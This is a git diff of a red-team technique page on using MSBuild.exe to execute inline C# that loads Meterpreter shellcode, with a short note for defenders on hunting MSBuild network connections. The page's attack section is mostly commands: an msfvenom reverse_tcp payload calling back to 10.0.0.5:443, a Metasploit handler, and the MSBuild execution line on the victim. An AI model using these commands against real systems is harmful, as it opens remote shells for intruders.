@@ -2,17 +2,17 @@
 
 It's possible to use a native windows binary MSBuild.exe to compile and execute inline C# code stored in an xml as discovered by [Casey Smith](https://twitter.com/subTee).
 
-## Execution
+### Execution
 
 Generate meterpreter shellode in c#:
 
-{% code title="attacker@kali" %}
+{% code title="attacker\@kali" %}
 ```csharp
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.0.0.5 LPORT=443 -f csharp
 ```
 {% endcode %}
 
-![](<../../.gitbook/assets/Screenshot from 2019-04-04 20-53-21.png>)
+![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LbdtHN2SuDKgSnn9ehL%2F-LbduVJDrfRCCGKEcWuV%2FScreenshot%20from%202019-04-04%2020-53-21.png?alt=media\&token=10c925be-fc41-4233-a2b9-697968046f86)
 
 Insert shellcode into the shellcode variable in linne 46:
 
@@ -84,11 +84,11 @@ Insert shellcode into the shellcode variable in linne 46:
 ```
 {% endcode %}
 
-![](<../../.gitbook/assets/Screenshot from 2019-04-04 20-54-14.png>)
+![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LbdtHN2SuDKgSnn9ehL%2F-LbdufQ1oTcTIYAkZKAv%2FScreenshot%20from%202019-04-04%2020-54-14.png?alt=media\&token=85fe682f-c893-41e8-b86f-1fce2e54fe31)
 
 Spin up a handler in metasploit to catch your shell:
 
-{% code title="attacker@kali" %}
+{% code title="attacker\@kali" %}
 ```csharp
 msfconsole -x "use exploits/multi/handler; set lhost 10.0.0.5; set lport 443; set payload windows/meterpreter/reverse_tcp; exploit"
 ```
@@ -96,19 +96,18 @@ msfconsole -x "use exploits/multi/handler; set lhost 10.0.0.5; set lport 443; se
 
 Build and execute malicious payload on the victim system using MSBuild:
 
-{% code title="attacker@victim" %}
+{% code title="attacker\@victim" %}
 ```csharp
 C:\Windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe C:\bad\bad.xml
 ```
 {% endcode %}
 
-![](<../../.gitbook/assets/Peek 2019-04-04 20-57.gif>)
+![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LbdtHN2SuDKgSnn9ehL%2F-LbdvOdWap7ZLXXIH0ZJ%2FPeek%202019-04-04%2020-57.gif?alt=media\&token=40330c47-89cf-48ac-8b1f-99dec494b085)
 
-## Observation
+### Observation
 
 Note that it's MSBuild.exe that will make the TCP connection to the attacker, so as a defender, you should think about hunting for TCP connections initiated by MSBuild.
 
-## References
+### References
 
 [https://gist.github.com/ConsciousHacker/5fce0343f29085cd9fba466974e43f17](https://gist.github.com/ConsciousHacker/5fce0343f29085cd9fba466974e43f17)
-
